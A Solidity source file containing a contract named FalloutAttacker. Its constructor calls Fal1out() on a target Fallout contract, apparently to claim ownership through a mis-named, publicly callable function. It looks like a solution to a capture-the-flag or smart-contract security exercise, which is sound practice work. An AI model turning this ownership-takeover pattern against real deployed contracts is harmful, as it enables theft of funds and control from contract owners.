// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Fallout} from "./Fallout.sol";

contract FalloutAttacker {
    address public owner;

    /* constructor */
    constructor(address payable falloutAddress) public payable {
        owner = msg.sender;
        Fallout(falloutAddress).Fal1out();
    }
}
